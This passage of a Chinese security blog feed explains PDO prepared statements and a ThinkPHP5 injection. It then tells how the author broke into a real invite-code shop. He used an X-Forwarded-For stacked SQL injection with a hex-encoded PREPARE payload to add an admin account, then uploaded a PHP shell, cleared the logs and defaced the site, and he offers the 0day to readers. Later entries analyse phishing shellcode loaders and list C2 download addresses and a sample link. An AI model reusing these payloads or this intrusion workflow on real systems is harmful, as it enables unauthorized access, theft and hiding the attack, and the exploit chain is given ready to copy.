&#39;root&#39;);$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM wz_admin WHERE id = :id&#39;);$stmt-&gt;execute(array(&#39;id&#39; =&gt; $id));print_r($stmt -&gt; fetchAll ());exit();</code></pre><blockquote><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符  </p><p>发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，它们是分开传送的，两者独立的，SQL注入攻击者没有一点机会</p></blockquote><h2 id="0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅"><a href="#0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅" class="headerlink" title="0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)"></a>0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)</h2><p>我们来看Phithon师傅几年前博客发的一个case</p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\index\model\User;class Index&#123;    public function index()    &#123;        $ids = input(&#39;ids/a&#39;);        $t = new User();        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    &#125;&#125;</code></pre><p>如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。</p><p>文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：</p><pre><code class="php">&lt;?php...$bindName = $bindName ?: &#39;where_&#39; . str_replace([&#39;.&#39;, &#39;-&#39;], &#39;_&#39;, $field);if (preg_match(&#39;/\W/&#39;, $bindName)) &#123;    // 处理带非单词字符的字段名    $bindName = md5($bindName);&#125;...&#125; elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) &#123;    // IN 查询    if ($value instanceof \Closure) &#123;        $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);    &#125; else &#123;        $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);        if (array_key_exists($field, $binds)) &#123;            $bind  = [];            $array = [];            foreach ($value as $k =&gt; $v) &#123;                if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) &#123;                    $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                &#125; else &#123;                    $bindKey = $bindName . &#39;_in_&#39; . $k;                &#125;                $bind[$bindKey] = [$v, $bindType];                $array[]        = &#39;:&#39; . $bindKey;            &#125;            $this-&gt;query-&gt;bind($bind);            $zone = implode(&#39;,&#39;, $array);        &#125; else &#123;            $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));        &#125;        $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;    &#125;</code></pre><p>可见，<code>$bindName</code>在前边进行了一次检测，正常来说是不会出现漏洞的。但如果<code>$value</code>是一个数组的情况下，这里会遍历<code>$value</code>，并将<code>$k</code>拼接进<code>$bindName</code>。</p><p>也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？</p><p>这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：</p><ol><li><code>prepare($SQL)</code> 编译SQL语句</li><li><code>bindValue($param, $value)</code> 将value绑定到param的位置上</li><li><code>execute()</code> 执行</li></ol><p>这个漏洞实际上就是控制了第二步的<code>$param</code>变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.cccfdc6225bf.png" alt="sp170704_025805.png"></a></p><p>所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。</p><p>但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：</p><pre><code class="PHP">&lt;?php$params = [    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];$db = new PDO(&#39;mysql:dbname=cat;host=127.0.0.1;&#39;, &#39;root&#39;, &#39;root&#39;, $params);try &#123;    $link = $db-&gt;prepare(&#39;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#39;);&#125; catch (\PDOException $e) &#123;    var_dump($e);&#125;</code></pre><p>执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.f4586aaea04f.png" alt="sp170704_032524.png"></a></p><p>究其原因，是因为我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。</p><p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后<code>execute()</code>的时候才发送给数据库执行；如果我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>这时，假设在第一步执行<code>prepare($SQL)</code>的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：</p><pre><code class="php">...// PDO连接参数protected $params = [    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];...</code></pre><p>可见，这里的确设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：</p><p><a href="http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231">http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.679dfef54084.png" alt="sp170704_021313.png"></a></p><p>但是，如果你将user()改成一个子查询语句，那么结果又会爆出<code>Invalid parameter number: parameter was not defined</code>的错误。</p><p>因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。</p><h2 id="0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day"><a href="#0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day" class="headerlink" title="0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day"></a>0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day</h2><h4 id="5-1-起因"><a href="#5-1-起因" class="headerlink" title="5.1 起因"></a>5.1 起因</h4><p>挖SRC，做项目做的心生烦闷，前几日忍不住在家看1024(cl)社区，越看越来劲，邪火攻心，想搜片看</p><p>奈何cl社区一向奉行邀请制，邀请码又很难搞到，可谓让人十分不爽</p><p>于是本人去google上找了一个卖1024社区邀请码的站</p><p><img src="https://i.loli.net/2021/05/26/s43NVSmyUhGxlP2.png" alt="image-20210526023044553"></p><p>88块钱….虽然不算贵，但售卖这种东西本来就是不受法律保护的。作为一个JB小子，怎么可能不动点白嫖心思？</p><p>在黑盒测试了一段时间后，发现支付逻辑和前台都没什么安全问题。。难道我真的要花钱买这激活码？？？？</p><p>不可能，绝对不可能。</p><p>看到网站底部有一个Powered by xxx，呵呵呵，好家伙，不出意外这应该就是这个站用的CMS系统了</p><p><img src="https://i.loli.net/2021/05/26/WT9bnVZrH5J1dKu.png" alt="image-20210526023227963"></p><p>去Git上一搜，还真有，2000多个Star，作者维护了好几年，也算是个成熟的项目了。</p><p>直接把最新版源码下载下来，丢进PHPstorm里开始审计</p><h4 id="5-2-从审计思路到PDO导致的前台XFF堆叠注入"><a href="#5-2-从审计思路到PDO导致的前台XFF堆叠注入" class="headerlink" title="5.2 从审计思路到PDO导致的前台XFF堆叠注入"></a>5.2 从审计思路到PDO导致的前台XFF堆叠注入</h4><p>就我个人而言，拿到一套源码，我更喜欢黑白盒相结合；根据前台能访问到的功能点来确定自己审计的目标</p><p>简单看了一下整套系统是MVC架构的，使用了PDO，使用有部分过滤规则；后台默认路径是&#x2F;admin</p><p>看了一遍前台的功能点，发现在查询订单处路径名很有趣，带有一个&#x2F;query，直接搜一下页面上关键词，跟进入到源码中</p><p><img src="https://i.loli.net/2021/05/26/bhl1B4yESK9C6d8.png" alt="image-20210526024734021"></p><p>发现了如下的一段code</p><p><img src="https://i.loli.net/2021/05/26/sgoDva5h4QYZIGw.png" alt="image-20210526025356848"></p><p>PDO均为默认配置，立马想到了堆叠注入</p><p>经测试orderid用户可控，全局搜索orderid发现，orderid经函数方法后被处理为纯字符串，没有注入余地，故选择另辟蹊径</p><p>后发现ip参数用户同样可控，在调用select方法前没做任何处理。</p><p>ip参数调用的是getClientIP方法，我们跟一下getClientIP方法</p><p><img src="https://i.loli.net/2021/05/26/hng6kUiuVRmO4aQ.png" alt="image-20210526030817917"></p><p>很好理解，就是从常见的http header中获取客户端IP</p><p>但是非常高兴，ip参数未做任何处理，我们可以通过构造XFF头来实现堆叠注入</p><p>因为有csrf_token的校验，我们必须在查询订单的页面，随便输入个订单号，随后输入正确的验证码，随后查询才有效</p><p>随后手动构造XFF头，进行针对PDO的堆叠注入</p><p>因为PDO处为双引号进行语句闭合，且属于无回显的堆叠注入</p><p>故构造Payload为</p><pre><code class="php">X-FORWARDED-For:1&#39;;select sleep(5)#</code></pre><p><img src="https://i.loli.net/2021/05/26/h6Tv1eJEpzQZcKg.png" alt="image-20210526202008945"></p><p>延迟了5s，注入成功。</p><p>针对这种没回显的堆叠注入，盲注太慢，用Dnslog OOB又太慢，所以选择构造一个添加后台管理员的insert payload</p><pre><code class="php">X-FORWARDED-For:1“;insert into t_admin_user values(99,&quot;test@test.test&quot;,&quot;76b1807fc1c914f15588520b0833fbc3&quot;,&quot;78e055&quot;,0);</code></pre><p>但是现实是很残酷的，测试发现，在XFF头中，1”将语句闭合后只要出现了引号或者逗号，就会引发报错，SQL语句无法执行</p><p>但是具有一定审计经验的兄弟一定会想到，PDO下Prepare Statement给我们提供了绕过过滤进行注入的沃土</p><p>山重水复疑无路，柳暗花明又一村</p><h4 id="5-3-Prepare-Statement构造注入语句"><a href="#5-3-Prepare-Statement构造注入语句" class="headerlink" title="5.3 Prepare Statement构造注入语句"></a>5.3 Prepare Statement构造注入语句</h4><p><strong>知识补充 — Prepare Statement写法</strong></p><p>MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT(预处理)</p><p>预制语句的SQL语法基于三个SQL语句：</p><pre><code class="sql">prepare stmt_name from preparable_stmt;execute stmt_name [using @var_name [, @var_name] ...];&#123;deallocate | drop&#125; prepare stmt_name;</code></pre><p>给出MYSQL中两个简单的demo</p><pre><code class="php">set@a=&quot;select user()&quot;;PREPARE a FROM @a;execute a;select sleep(3);#set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  //73656C65637420757365722829为select user() 16进制编码后的字符串，前面再加上0x声明这是一个16进制字符串</code></pre><p>Prepare语句在防范SQL注入方面起到了非常大的作用，但是对于SQL注入攻击却也提供了新的手段。</p><p>Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。</p><p>将我们的insert语句直接hex编码</p><p><img src="https://i.loli.net/2021/05/26/ZcOIGsY7y4LeT2w.png" alt="image-20210526200448332"></p><p>构造注入语句</p><pre><code class="php">X-FORWARDED-For:1&quot;;set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#//sleep用于判断注入是否成功</code></pre><p><img src="https://i.loli.net/2021/05/26/PIcbgu84aAz1OQt.png" alt="image-20210526201816276"></p><p>延时3s，注入成功，成功添加了一个账号为<a href="mailto:&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;">&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;</a>，密码为123456的后台管理员</p><p>直接默认后台路径&#x2F;admin登录后台</p><p><img src="https://i.loli.net/2021/05/26/e2Q5VTXWOKxEYpM.png" alt="image-20210526202209072"></p><p>前台提交一个cl社区邀请码的订单</p><p>后台修改订单状态为确认付款</p><p><img src="https://i.loli.net/2021/05/26/hqzsVuaZxb2AnOW.png" alt="image-20210526202525849"></p><p>没过一会，邀请码直接到邮箱</p><p><img src="https://i.loli.net/2021/05/26/tY5ZA1vmCTyjDMs.png" alt="image-20210526202705629"></p><p>以后可以搜片看了</p><p><img src="https://i.loli.net/2021/05/26/zMArkUQ8eyBa3C9.png" alt="image-20210526202913110"></p><p><img src="https://i.loli.net/2021/05/26/Idr6JSnjLpb5zuF.jpg" alt="ä¿å­ä¿å­å¨é¨ä¿å­ï¼ç»§ç»­ååï¼"></p><h4 id="5-4-不讲武德被发现"><a href="#5-4-不讲武德被发现" class="headerlink" title="5.4 不讲武德被发现"></a>5.4 不讲武德被发现</h4><p>在不讲武德，连续薅了几个邀请码，发给朋友后</p><p>站长终于发现了</p><p><img src="https://i.loli.net/2021/05/26/Rf3U9MGvTdsz86S.png" alt="image-20210526203058983"></p><p>八嘎，既然发现了，那就干脆把你的站日下来吧，然后好好擦擦屁股，免得0day被这站长抓走</p><p><img src="https://i.loli.net/2021/05/26/TPcSE51ULyY8rBF.jpg" alt="çå°´å°¬å"></p><h4 id="5-5-后台Getshell审计-Thanks-17-M78sec"><a href="#5-5-后台Getshell审计-Thanks-17-M78sec" class="headerlink" title="5.5 后台Getshell审计(Thanks 17@M78sec)"></a>5.5 后台Getshell审计(Thanks 17@M78sec)</h4><p>经测试后台的文件上传处鉴权比较严格，没法直接前台getshell</p><p>但是后台文件上传处，没有对文件扩展名进行任何过滤，只有一处前端js校验，所以后台getshell直接白给</p><p><img src="https://i.loli.net/2021/05/26/SjJafoTI2K6N3lA.png" alt="image-20210526205833957"></p><p>文件上传后不会返回上传路径，但上传路径和上传文件的命名规则我们已经了如指掌</p><p><img src="https://i.loli.net/2021/05/26/IGrMv2QtBoK31Ey.png" alt="image-20210526204139761"></p><p>UPLOAD_PATH定义如下</p><pre><code>define(&#39;UPLOAD_PATH&#39;, APP_PATH.&#39;/public/res/upload/&#39;);</code></pre><p>CUR_DATE定义如下</p><pre><code>define(&#39;CUR_DATE&#39;, date(&#39;Y-m-d&#39;));</code></pre><p>文件名</p><pre><code>$filename=date(&quot;His&quot;);  //小时+分钟+秒</code></pre><p>以我现在21点05分钟为例，输出结果如下</p><p><img src="https://i.loli.net/2021/05/26/OYBvblwyEn8hL3J.png" alt="image-20210526210650296"></p><p>以2021年5月26日的21点05分44秒为例</p><p>完整的文件路径即为</p><pre><code>http://www.xxx.com/res/upload/2021-05-26/210444.php</code></pre><p>直接构造表单</p><pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;&lt;form action=&quot;http://xxx.top/Admin/products/imgurlajax&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;File:&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;text&quot; name=&quot;pid&quot; id=&quot;pid&quot; /&gt;  &lt;--! pid记得自行修改为商品的id(后台选择商品抓包即可获取)--&gt;&lt;/--!&gt;    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;</code></pre><p>同时需要添加Referer: <a href="http://xxx.top/Admin/products/imgurl/?id=1,%E5%B9%B6%E4%BF%AE%E6%94%B9%E4%B8%8B%E6%96%B9%E7%9A%84">http://xxx.top/Admin/products/imgurl/?id=1,并修改下方的</a></p><p>否则会提示“请选择商品id”</p><p>最后完整的上传http request如下</p><pre><code class="http">POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1Host: xxxxContent-Length: 291Accept: application/json, text/javascript, */*; q=0.01DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0ebOrigin: http://47.105.132.207Referer: http://xxx.top/Admin/products/imgurl/?id=12Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaqConnection: close------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;Content-Type: image/png&lt;?php    phpinfo();------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;pid&quot;12------WebKitFormBoundaryeSrhtSPGxub0H0eb--</code></pre><p>直接上传成功</p><p>随后通过burpsuite Intruder来跑一下最后的秒数</p><p>毕竟秒数不能拿捏的那么精准</p><p><img src="https://i.loli.net/2021/05/26/n8phY6lVJbKaBPd.png" alt="image-20210526212753095"></p><p><img src="https://i.loli.net/2021/05/26/VbxMQNrkJFA7mo9.png" alt="image-20210526233749316"></p><p>直接拿捏。</p><p>把web日志清理掉</p><p>然后给public index页面加点乐子</p><p><img src="https://i.loli.net/2021/05/26/OgoMxL3fnZaSDwv.png" alt="image-20210526234200023"></p><p>传统功夫，点到为止。</p><p><img src="https://i.loli.net/2021/05/26/iGZFs84qVx2SjR7.png" alt="image-20210526234615393"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文主要介绍了通过PDO防范SQL注入的方法和PDO中的注入利用思路，并给大家带来了一个0day实例</p><p>你会发现层层抽丝剥茧研究一个模块，并将其中的姿势应用于实战中，是一件很美妙的事情。</p><p>相信师傅们是很容易定位到出现本0day的系统的，这个0day就算白送各位师傅的了，希望师傅们也早日成为1024社区会员</p><p><img src="https://i.loli.net/2021/05/26/slFQitd5wUKnvj1.jpg" alt="img"></p><h2 id="0x07-Refence："><a href="#0x07-Refence：" class="headerlink" title="0x07 Refence："></a>0x07 Refence：</h2><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><p><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a></p><p><a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年 hw红队样本分析(三) - NimShellcodeLoader</title>
      <link href="/2021/04/12/2021%E5%B9%B4-hw%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%89-NimShellcodeLoader/"/>
      <url>/2021/04/12/2021%E5%B9%B4-hw%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%89-NimShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-样本概况"><a href="#0x01-样本概况" class="headerlink" title="0x01 样本概况"></a>0x01 样本概况</h2><p>Name:主机邮件安全检查工具</p><p>ico使用的是360的图标</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050736.png" alt="image"></p><p>在Virustotal网站上，样本报毒1引擎，基本上绕过了全部国产杀毒，免杀效果较好</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050063.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050747.png" alt="image"></p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221214242110-1184156425.png" alt="image"></p><h2 id="0x02-样本分析"><a href="#0x02-样本分析" class="headerlink" title="0x02 样本分析"></a>0x02 样本分析</h2><p>对该样本进行反编译处理，</p><p>根据程序中各地址字符串信息可以推断</p><p>该样本使用了较为小众的语言nim作为shellcode loader</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050496.png" alt="image"></p><p>因为该样本使用的是nim语言，导致反编译出现有较大困难</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050614.png" alt="image"></p><p>获取到了部分远程加载地址</p><p><a href="http://47.105.76.103:8023/log.txt">http://47.105.76.103:8023/log.txt</a><br><a href="http://47.105.76.103:8081/cm">http://47.105.76.103:8081/cm</a><br><a href="http://47.105.76.103:8081/lbJD">http://47.105.76.103:8081/lbJD</a><br>根据字符串信息+动态调试结果推断该恶意样本执行流程如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050376.png" alt="image"></p><p>下载<a href="http://47.105.76.103:8023/log.txt">http://47.105.76.103:8023/log.txt</a><br>数据解密后注入到cleanmgr.exe进程中</p><p>然后VitualAlloc放入内存加载</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050954.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050657.png" alt="image"></p><p>根据Yara规则识别为Cobbaltstrike HTTPS x64载荷</p><h2 id="0x03-样本loader来源"><a href="#0x03-样本loader来源" class="headerlink" title="0x03 样本loader来源"></a>0x03 样本loader来源</h2><p>经过一番Github搜索，发现该GIT项目生成的C2样本与本样本在执行方法和逻辑上高度一致</p><p><a href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p><p>推测红队使用了本项目进行C2程序生成</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050050.png" alt="image"></p><h2 id="0x04-样本下载链接"><a href="#0x04-样本下载链接" class="headerlink" title="0x04 样本下载链接"></a>0x04 样本下载链接</h2><p>链接：<a href="https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ">https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ</a><br>提取码：m78s</p>]]></content>
      
      
      
        <tags>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年-HW红队样本分析(二) - C++ ShellcodeLoader</title>
      <link href="/2021/04/12/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%BA%8C-C-ShellcodeLoader/"/>
      <url>/2021/04/12/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%BA%8C-C-ShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-样本概况"><a href="#0x01-样本概况" class="headerlink" title="0x01 样本概况"></a>0x01 样本概况</h2><p>Name:国家xx局安全升级文档.docs.exe</p><p>ico为word的，很显然在利用已知扩展名隐藏的特性在钓鱼</p><p>在Virustotal网站上，样本报毒9引擎，基本上绕过了全部国产杀毒，免杀效果相对较好</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049043.png" alt="image"><br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049813.png" alt="image"></p><p>其样本为C2远控样本，回链地址为39.107.95.197</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049135.png" alt="image"></p><p>其回连IP已经被标记为恶意C2 IP</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049252.png" alt="image"></p><p>行为特征如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049060.png" alt="image"></p><h2 id="0x02-样本分析"><a href="#0x02-样本分析" class="headerlink" title="0x02 样本分析"></a>0x02 样本分析</h2><p>对该样本进行反编译处理，该恶意样本执行流程如下创建互斥体<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049037.png" alt="image"></p><p>检查用户名<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049920.png" alt="image"></p><p>检查当前环境是否为虚拟机</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049042.png" alt="image"></p><p>检查系统语言</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049529.png" alt="image"></p><p>从<a href="http://39.107.95.197:8888/update64.bin%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B9%B6%E5%A4%8D%E5%88%B6%E5%88%B0%E5%86%85%E5%AD%98">http://39.107.95.197:8888/update64.bin下载文件并复制到内存</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049405.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049288.png" alt="image"></p><p>virtualAlloc开辟内存后</p><p>将刚刚下载的bin文件的shellcode加载到开辟的内存中并且执行</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050608.png" alt="image"></p><p>winhex查看bin文件</p><p>其shellcode为标准的cs https beacon载荷，回连地址如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050588.png" alt="image"></p><h2 id="0x03样本下载链接"><a href="#0x03样本下载链接" class="headerlink" title="0x03样本下载链接"></a>0x03样本下载链接</h2><p>链接：<a href="https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ">https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ</a><br>提取码：m78s</p>]]></content>
      
      
      
        <tags>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年 HW红队样本分析(一)-PythonShellcodeLoader</title>
      <link href="/2021/04/09/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%80-PythonShellcodeLoader/"/>
      <url>/2021/04/09/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%80-PythonShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-邮件原文与样本"><a href="#0x01-邮件原文与样本" class="headerlink" title="0x01 邮件原文与样本"></a>0x01 邮件原文与样本</h2><p>hw期间内部邮箱网关收到了钓鱼邮件</p><p>邮件原文如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048898.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048688.png" alt="image"></p><p>解压后得到样本</p><p>财险内部旅游套餐方案.pdf.exe</p><p>样本为大小为5.88M,HASH如下</p><p>MD5</p><p>5bc32973b43593207626c0588fc6247e</p><p>SHA-1</p><p>551414cb283a56cf55817c720c2efee0144ea2ed</p><p>SHA-256</p><p>d12e852eeefa87e75c7876fb53947b979bfbf880eb825eb58b9fe7f0132809ad</p><p>VT报毒 14&#x2F;69，免杀效果尚可</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048716.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048382.png" alt="image"></p><p>通过Yara规则检测，为典型的Cobaltstrike x64 https beacon载荷</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048331.png" alt="image"></p><p>基于程序体积和逆向后获取到的函数判断，该恶意样本为Python编写的shellcodeloader来加载CS https beacon X64 shellcode,后用py2exe程序进行封装</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048131.png" alt="image"></p><p>对该程序进行逆向unpy2exe逆向分析，取得其源码</p><pre><code class="python">\# uncompyle6 version 3.7.4\# Python bytecode 3.7\# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]\# Embedded file name: py36test.pyimport ctypes, urllib, base64, requests, hashlibdef shellCodeLoad(shellcode):  